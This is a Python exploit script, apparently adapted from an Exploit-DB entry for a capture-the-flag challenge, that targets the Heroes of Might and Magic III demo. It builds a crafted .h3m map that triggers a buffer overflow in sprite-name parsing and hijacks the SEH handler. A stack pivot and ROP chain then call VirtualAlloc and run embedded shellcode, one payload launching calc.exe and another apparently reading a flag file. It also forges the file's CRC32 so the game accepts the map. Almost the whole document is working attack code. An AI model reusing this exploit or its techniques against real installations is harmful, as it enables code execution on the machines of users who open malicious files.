# Modified https://www.exploit-db.com/exploits/37737 exploit for Heroes Pwn challenge from hackcert.pl platform.

from struct import pack, unpack
import zlib


###################################################################################################
#### SHELLCODE                                                                                #####
###################################################################################################
CALC_SHELLCODE = (
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
)


SHELLCODE = b'\x81\xec\x00\x01\x00\x00\x55\x89\xe5\x68\x74\x78\x74\x00\x68\x6c\x61\x67\x2e\x68\x44\x3a\x5c\x66\x54\x5e\x31\xc0\x50\x68\x80\x00\x00\x00\x6a\x03\x50\x50\x68\x00\x00\x00\x80\x56\xa1\xe8\x40\x5b\x00\xff\xd0\x83\xec\x24\x54\x5e\x6a\x00\x56\x6a\x20\x83\xc6\x04\x56\x50\xa1\xdc\x40\x5b\x00\xff\xd0\x68\x00\x10\x00\x00\x56\x56\x6a\x00\xa1\x08\x42\x5b\x00\xff\xd0'





###################################################################################################
#### MAIN                                                                                     #####
###################################################################################################
def main():
    default_map = make_default_h3m()
    malicious_map = inject_payload(default_map, CALC_SHELLCODE)
    crc_valid_malicious_map = forge_crc(DEMO_CRC, malicious_map)
    with open('C:\\Users\\User\\h3\\h3game\\Heroes III Demo\\Maps\\h3demo.h3m', 'wb') as f:
        f.write(crc_valid_malicious_map)



###################################################################################################
#### EXPLOIT                                                                                  #####
###################################################################################################
SEH_HANDLER_OFST = 240
PIVOT_1816_GADGET = 0x0054a7e3

def create_rop_chain():
    '''Register setup for VirtualAlloc() :
        --------------------------------------------
        EAX = NOP (0x90909090)
        ECX = flProtect (0x40)
        EDX = flAllocationType (0x1000)
        EBX = dwSize
        ESP = lpAddress (automatic)
        EBP = ReturnTo (ptr to jmp esp)
        ESI = ptr to VirtualAlloc()
        EDI = ROP NOP (RETN) '''
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x005a6a80,  # POP EAX # RETN [h3demo.exe] 
        0x41414141,  # Added manually, as stack_pivot ends with ret 4
        0x005b4068,  # ptr to &VirtualAlloc() [IAT h3demo.exe]
        0x005a2d01,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [h3demo.exe] 
        0x0056ce54,  # XCHG EAX,ESI # RETN [h3demo.exe] 
        #[---INFO:gadgets_to_set_ebp:---]
        0x005a7b1b,  # POP EBP # RETN [h3demo.exe] 
        0x004d1f4d,  # & call esp [h3demo.exe]
        #[---INFO:gadgets_to_set_ebx:---]
        0x0054646d,  # POP EBX # RETN [h3demo.exe] 
        0x00000001,  # 0x00000001-> ebx
        #[---INFO:gadgets_to_set_edx:---]
        0x005a0ae0,  # POP EDX # RETN [h3demo.exe] 
        0x00001000,  # 0x00001000-> edx
        #[---INFO:gadgets_to_set_ecx:---]
        0x005aa177,  # POP ECX # RETN [h3demo.exe] 
        0x00000040,  # 0x00000040-> ecx
        #[---INFO:gadgets_to_set_edi:---]
        0x0053b8e2,  # POP EDI # RETN [h3demo.exe] 
        0x0050c542,  # RETN (ROP NOP) [h3demo.exe]
        #[---INFO:gadgets_to_set_eax:---]
        0x005a0574,  # POP EAX # RETN [h3demo.exe] 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x0059c334,  # PUSHAD # RETN [h3demo.exe] 
    ]
    return b''.join(pack('<I', _) for _ in rop_gadgets)


def inject_payload(m, shellcode):
    '''Injects shellcode into a valid, uncompress map in .h3m format.
    The shellcode will trigger when parsing object attributes array. The program reads 
    the size of spirit name and then reads the <spirit name size> bytes into buffer of size 96.
    This leads to buffer overflow. The patch checks if loaded name contains more then null byte.
    If so it causes SIGSEV by executing: mov [eax], 0 instruction.'''
    # Find the object attributes array in the file by searching for a sprite name that occurs
    # as the first game object in all maps.
    objects_pos = m.find(b'AVWmrnd0.def')

    # Entries in the objects array start with a string size followed by game sprite name string
    # Move back 4 bytes from the first sprite name to get to the start of the objects array
    objects_pos -= 4

    # First pivot the stack. We need to increase esp by 1732 bytes, but there is only pivot which
    # increases esp by 1816 bytes. Therefore add some junk to fill the gap.
    pivot = pack('<L', PIVOT_1816_GADGET)
    pivot  += (1816 - 1732) * b'A'

    # Then trigger ROP chain which will use VirtualAlloc to mark stack part where shellcode is placed to executable
    rop = create_rop_chain()

    # Construct a malicious object entry with a big size.
    payload_size = SEH_HANDLER_OFST + len(pivot) + len(rop) + len(shellcode)
    payload = pack('<L', payload_size)
    payload += b'\x00' * 2 + b'A' * (SEH_HANDLER_OFST - 6)
    payload += pivot
    payload += rop
    payload += shellcode

    # Don't care about overwriting the rest of the map. It will have no time to parse it anyway.
    m = m[:objects_pos] + payload + m[objects_pos:]
    return m



###################################################################################################
#### DEFAULT_H3M                                                                              #####
###################################################################################################
def make_default_h3m():
    '''Returns data for a minimimum required S size h3m map containing 2 players'''
    # Set map specifications to 36x36 (0x24000000) map with 2 players, with
    # default/no settings for name, description, victory condition etc
    default_map = b''
    default_map += b'\x0e\x00\x00\x00\x01\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    default_map += b'\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\xff\x01\x01\x00\x01\x00'
    default_map += b'\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x8c'
    default_map += b'\x00\x00\xff\x00\x00\x00\x00\xb1\x00\x00\xff\x00\x00\x00\x00\x00'
    default_map += b'\x00\x00\xff\x00\x00\x00\x00\x7f\x00\x00\xff\x00\x00\x00\x00\x48'
    default_map += b'\x00\x00\xff\xff\xff\x00'
    default_map += b'\xFF' * 16
    default_map += b'\x00' * 35

    # Each tile is 7 bytes, fill map with empty dirt tiles (0x00)
    default_map += b'\x00' * (36 * 36 * 7)

    # Set object attribute array count to 1
    default_map += b'\x01\x00\x00\x00'

    # Size of first sprite name, this will be overwritten
    default_map += b'\x12\x34\x56\x78'

    # Standard name for first object, which will be searched for
    default_map += b'AVWmrnd0.def'

    return default_map



###################################################################################################
#### CRC32 FORGING                                                                            #####
###################################################################################################
POLY = 0xedb88320 # CRC-32-IEEE 802.3
DEMO_CRC = 0xFEEFB9EB

def build_crc_tables():
    crc32_table, crc32_reverse = [0]*256, [0]*256
    for i in range(256):
        fwd = i
        rev = i << 24
        for j in range(8, 0, -1):
            # build normal table
            if (fwd & 1) == 1:
                fwd = (fwd >> 1) ^ POLY
            else:
                fwd >>= 1
            crc32_table[i] = fwd & 0xffffffff
            # build reverse table =)
            if rev & 0x80000000 == 0x80000000:
                rev = ((rev ^ POLY) << 1) | 1
            else:
                rev <<= 1
            rev &= 0xffffffff
            crc32_reverse[i] = rev
    return crc32_table, crc32_reverse


def crc32(s):
    '''Same crc32 as in (binascii.crc32) & 0xffffffff'''
    crc32_table, _ = build_crc_tables()
    crc = 0xffffffff
    for c in s:
        crc = (crc >> 8) ^ crc32_table[(crc ^ c) & 0xff]
    return crc^0xffffffff
 

def forge_crc(wanted_crc, str, pos=None):
    crc32_table, crc32_reverse = build_crc_tables()

    # If not stated, then append the forged crc bytes at the end
    if pos is None:
        pos = len(str)
 
    # forward calculation of CRC up to pos, sets current forward CRC state
    fwd_crc = 0xffffffff
    for c in str[:pos]:
        fwd_crc = (fwd_crc >> 8) ^ crc32_table[(fwd_crc ^ c) & 0xff]
 
    # backward calculation of CRC up to pos, sets wanted backward CRC state
    bkd_crc = wanted_crc ^ 0xffffffff
    for c in str[pos:][::-1]:
        bkd_crc = ((bkd_crc << 8) & 0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ c
 
    # deduce the 4 bytes we need to insert
    for c in pack('<L', fwd_crc)[::-1]:
        bkd_crc = ((bkd_crc << 8) & 0xffffffff) ^ crc32_reverse[bkd_crc >> 24] ^ c
 
    res = str[:pos] + pack('<L', bkd_crc) + str[pos:]
    assert(crc32(res) == wanted_crc)
    return res




if __name__ == '__main__':
    main()